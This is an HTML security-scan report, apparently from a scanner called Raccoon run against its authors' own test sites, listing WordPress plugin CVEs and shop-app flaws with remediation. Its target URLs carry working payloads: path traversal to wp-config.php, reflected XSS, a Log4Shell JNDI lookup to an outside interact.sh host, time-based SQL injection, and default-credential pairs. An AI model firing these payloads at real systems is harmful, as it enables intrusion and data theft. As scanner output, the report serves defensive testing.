@@ -1,0 +1,1314 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<!-- Required meta tags -->
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+<!-- Bootstrap CSS -->
+<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" rel="stylesheet"/>
+<!-- css -->
+<link href="https://raccoon-solution.online/RacconDocumentation/css/style.css" rel="stylesheet"/>
+<!--       <link href="../css/style.css" rel="stylesheet"/>-->
+<!-- icon -->
+<link href="https://raccoon-solution.online/RacconDocumentation/images/favicon-16x16.png" rel="icon" type="images/x-icon"/>
+<title>Raccoon Report</title>
+</head>
+<body onload="drawSeverityChart(2, 2, 4, 5, 1)">
+<header>
+<nav class="navbar navbar-expand-lg navbar-dark static-top">
+<div class="container">
+<a class="navbar-brand" href="https://raccoon-solution.online/">
+<img alt="icon" height="50" src="https://raccoon-solution.online/RacconDocumentation/images/favicon.ico"/>
+</a>
+<button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-bs-target="#navbarSupportedContent" data-bs-toggle="collapse" type="button">
+<span class="navbar-toggler-icon"></span>
+</button>
+<div class="collapse navbar-collapse" id="navbarSupportedContent">
+<ul class="navbar-nav ms-auto">
+<li class="nav-item">
+<a aria-current="page" class="nav-link active" href="https://raccoon-solution.online/index.html">Getting Started</a>
+</li>
+<li class="nav-item">
+<a class="nav-link active" href="https://raccoon-solution.online/templateGuide.html">Template Guide</a>
+</li>
+<li class="nav-item">
+<a class="nav-link active" href="#">About Us</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+</header>
+<main>
+<h1 style="text-align: center;">  Raccoon - Report Detail </h1>
+<div class="chart-container">
+<canvas id="myChart"></canvas>
+</div>
+<div id="container">
+<ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php">http://wordpress.raccoon-solution.online/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2019-14205</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Ext Adaptive Images LFI</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Upgrade to version 0.6.67 or later.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,cve2019,wordpress,wp-plugin,lfi</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">A Local File Inclusion vulnerability in the Nevma Adaptive Images plugin before 0.6.67 for WordPress allows remote attackers to retrieve arbitrary files via the $REQUEST['adaptive-images-settings']['source_file'] parameter in adaptive-images-script.php.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://github.com/security-kma/EXPLOITING-CVE-2019-14205<br/>- https://markgruffer.github.io/2019/07/19/adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.html<br/>- https://wordpress.org/plugins/adaptive-images/#developers<br/>- https://github.com/markgruffer/markgruffer.github.io/blob/master/_posts/2019-07-19-adaptive-images-for-wordpress-0-6-66-lfi-rce-file-deletion.markdown<br/></div>
+</li>
+</ul>
+</hr></li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol>
+<ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://&lt;/script&gt;&lt;svg/onload=alert(%27{{randstr}}%27)&gt;">http://wordpress.raccoon-solution.online/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://&lt;/script&gt;&lt;svg/onload=alert(%27{{randstr}}%27)&gt;</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2021-24495</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Wordpress Plugin Marmoset Viewer XSS</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update to 1.9.3 or later.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: yellow; font-weight: bold">medium</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,cve2021,wp-plugin,wordpress,xss</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">The Marmoset Viewer WordPress plugin before 1.9.3 does not property sanitize, validate or escape the 'id' parameter before outputting back in the page, leading to a reflected Cross-Site Scripting issue.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://johnjhacking.com/blog/cve-2021-24495-improper-neutralization-of-input-during-web-page-generation-on-id-parameter-in-wordpress-marmoset-viewer-plugin-versions-1.9.3-leads-to-reflected-cross-site-scripting/<br/>- https://wordpress.org/plugins/marmoset-viewer/#developers<br/>- https://wpscan.com/vulnerability/d11b79a3-f762-49ab-b7c8-3174624d7638<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/">http://wordpress.raccoon-solution.online/</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2022-0288</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Ad Inserter &lt; 2.7.10 - Reflected Cross-Site Scripting</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update to 2.7.12 or above.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: yellow; font-weight: bold">medium</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,cve2022,wordpress,xss</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">The plugins do not sanitise and escape the html_element_selection parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/vulnerability/27b64412-33a4-462c-bc45-f81697e4fe42<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain)%3b&amp;message=Not+Found&amp;site_name=404">http://wordpress.raccoon-solution.online/wp-content/plugins/profile-builder/assets/misc/fallback-page.php?site_url=javascript:alert(document.domain)%3b&amp;message=Not+Found&amp;site_name=404</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2022-0653</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Wordpress Profile Builder Plugin Cross-Site Scripting</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Upgrade to version 3.6.5 or later.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: yellow; font-weight: bold">medium</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,cve2022,wordpress,xss,wp-plugin</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">The Profile Builder User Profile &amp; User Registration Forms WordPress plugin is vulnerable to cross-site scripting due to insufficient escaping and sanitization of the site_url parameter found in the ~/assets/misc/fallback-page.php file which allows attackers to inject arbitrary web scripts onto a pages that executes whenever a user clicks on a specially crafted link by an attacker. This affects versions up to and including 3.6.1..
+</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-0653<br/>- https://www.wordfence.com/blog/2022/02/reflected-cross-site-scripting-vulnerability-patched-in-wordpress-profile-builder-plugin/<br/>- https://plugins.trac.wordpress.org/changeset?sfp_email=&amp;sfph_mail=&amp;reponame=&amp;old=2655168%40profile-builder&amp;new=2655168%40profile-builder&amp;sfp_email=&amp;sfph_mail=<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/simple-ajax-chat/sac-export.csv">http://wordpress.raccoon-solution.online/wp-content/plugins/simple-ajax-chat/sac-export.csv</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2022-27849</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Simple Ajax Chat plugin Sensitive Information Disclosure vulnerability</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Upgrade to version 20220216 or later.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">wp,wordpress,wp-plugin,cve,cve2022,disclosure</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">The Simple Ajax does not properly restrict access to the exported data via the sac-export.csv file, which could allow unauthenticated users to access it.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wordpress.org/plugins/simple-ajax-chat/#developers<br/>- https://nvd.nist.gov/vuln/detail/CVE-2022-27849/<br/>- https://patchstack.com/database/vulnerability/simple-ajax-chat/wordpress-simple-ajax-chat-plugin-20220115-sensitive-information-disclosure-vulnerability<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php">http://wordpress.raccoon-solution.online/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2022-1119</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Simple File List &lt; 3.2.8 - Arbitrary File Retrieval</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Upgrade to version 3.2.8 or later.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,cve2022,lfi,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">The Wordpress plugin is vulnerable to arbitrary file retrieval via the eeFile parameter found in the ~/includes/ee-downloader.php file due to missing controls which make it possible for unauthenticated attackers retrieve arbitrary files.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://nvd.nist.gov/vuln/detail/CVE-2022-1119<br/>- https://wpscan.com/vulnerability/5551038f-64fb-44d8-bea0-d2f00f04877e<br/>- https://wpscan.com/vulnerability/075a3cc5-1970-4b64-a16f-3ec97e22b606<br/>- https://plugins.trac.wordpress.org/browser/simple-file-list/trunk/includes/ee-downloader.php?rev=2071880<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/?x=${jndi:ldap://${hostName}.uri.w39n0mdvqtc6i6nrakh0uslecafkifqae.interact.sh/a}">http://demo.raccoon-solution.online/?x=${jndi:ldap://${hostName}.uri.w39n0mdvqtc6i6nrakh0uslecafkifqae.interact.sh/a}</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">CVE-2021-44228</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Apache Log4j2 Remote Code Injection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: red; font-weight: bold">critical</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">cve,rce,log4j</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://logging.apache.org/log4j/2.x/security.html<br/>- https://www.lunasec.io/docs/blog/log4j-zero-day<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- 162.158.176.90<br/>- 108.162.223.221<br/>- text/html;charset=ISO-8859-1<br/>- useragent<br/>- vps<br/></div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/login">http://demo.raccoon-solution.online/login</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">Bruteforce-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Bruteforce Shoes Shop Login Page</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Change to more powerfull password. These passwords and users are default credentials which are weak and can easily be guessed.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">bruteforce,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Shoes Shop check some login credentials</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- section start <br/>- section header<br/>- section start <br/>- section layout<br/>- section end <br/>- section footer start <br/>- section footer end <br/></div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- username: admin<br/>- password: admin<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/login">http://demo.raccoon-solution.online/login</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">Bruteforce-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Bruteforce Shoes Shop Login Page</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Change to more powerfull password. These passwords and users are default credentials which are weak and can easily be guessed.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">bruteforce,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Shoes Shop check some login credentials</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- section start <br/>- section header<br/>- section start <br/>- section layout<br/>- section end <br/>- section footer start <br/>- section footer end <br/></div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- username: admin<br/>- password: ADMIN<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/login">http://demo.raccoon-solution.online/login</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">Bruteforce-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Bruteforce Shoes Shop Login Page</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Change to more powerfull password. These passwords and users are default credentials which are weak and can easily be guessed.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">bruteforce,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Shoes Shop check some login credentials</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- section start <br/>- section header<br/>- section start <br/>- section layout<br/>- section end <br/>- section footer start <br/>- section footer end <br/></div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- username: demo<br/>- password: demo<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/login">http://demo.raccoon-solution.online/login</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">Bruteforce-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Bruteforce Shoes Shop Login Page</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Change to more powerfull password. These passwords and users are default credentials which are weak and can easily be guessed.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">bruteforce,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Shoes Shop check some login credentials</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- section start <br/>- section header<br/>- section start <br/>- section layout<br/>- section end <br/>- section footer start <br/>- section footer end <br/></div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- username: tony<br/>- password: 123456<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/search?name=1%27+UNION+ALL+SELECT+1%2C+sleep%285%29%2C3%2C4%2C5+--+">http://demo.raccoon-solution.online/search?name=1%27+UNION+ALL+SELECT+1%2C+sleep%285%29%2C3%2C4%2C5+--+</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">TimebasedSQLInjection-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Time-based SQL Injection in Web Shoes Shop</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Using prepared statements, whitelist input validation, escaping all user supplied input, constructed stored procedures.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: orange; font-weight: bold">high</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">sqli,time-based,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect SQL Injection in Shoes Shop</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://owasp.org/www-community/attacks/Blind_SQL_Injection<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://demo.raccoon-solution.online/contact">http://demo.raccoon-solution.online/contact</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">XSS-Web-Shoes-Shop</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">XSS in Web Shoes Shop</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Use whitelist input validation, escape unvalidated input such as &lt; to &amp;lt, &gt; to &amp;gt, " to &amp;quot. Use htmlentities for HTML context or Javascript unicode for Javascript context.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: yellow; font-weight: bold">medium</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">xss,shoes-shop</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect XSS in Shoes Shop</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://portswigger.net/web-security/cross-site-scripting<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-admin/maint/repair.php">http://wordpress.raccoon-solution.online/wp-admin/maint/repair.php</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-db-repair</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">Wordpress DB Repair Exposed</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Danh, Hoa</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Disable or forbidden people access to this page.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: green; font-weight: bold">low</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">wordpress,config</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Discover enabled Wordpress repair page.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://monovm.com/blog/how-to-repair-wordpress-database/<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- No payload was specify</div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/adaptive-images/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/adaptive-images/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
+<span class="list-item">Description:</span>
+<span class="description">Detect plugins that WordPress is using.</span>
+</li>
+<li>
+<span class="list-item">Reference:</span>
+<div class="reference">- https://wpscan.com/plugins<br/></div>
+</li>
+</ul>
+</li>
+<li class="exposer listItem">
+<span class="title">Exposer:</span>
+<hr/>
+<div class="exposerContent">- No exposer was specify</div>
+</li>
+<li class="payloads listItem">
+<span class="title">Injected Payloads:</span>
+<hr/>
+<div class="listPayloads">- wp-plugin: adaptive-images<br/></div>
+</li>
+</ol><ol class="reportList">
+<li class="info listItem">
+<span class="title"> Target: </span>
+<a class="target" href="http://wordpress.raccoon-solution.online/wp-content/plugins/ad-inserter/readme.txt">http://wordpress.raccoon-solution.online/wp-content/plugins/ad-inserter/readme.txt</a>
+<hr/>
+<span class="title"> Template Information:</span>
+<hr/>
+<ul class="infoList">
+<li>
+<span class="list-item">Id:</span>
+<span class="id">wp-plugins-detect</span>
+</li>
+<li>
+<span class="list-item">Name:</span>
+<span class="name">WordPress Plugins Detection</span>
+</li>
+<li>
+<span class="list-item">Author:</span>
+<span class="author">Hung, Dat, Hoa, Danh</span>
+</li>
+<li>
+<span class="list-item">Remediation:</span>
+<span class="remediation">Update installed themes to latest.</span>
+</li>
+<li>
+<span class="list-item">Severity:</span>
+<span class="severity" style="color: grey; font-weight: bold">info</span>
+</li>
+<li>
+<span class="list-item">Tag:</span>
+<span class="tags">fuzz,wordpress</span>
+</li>
+<li>
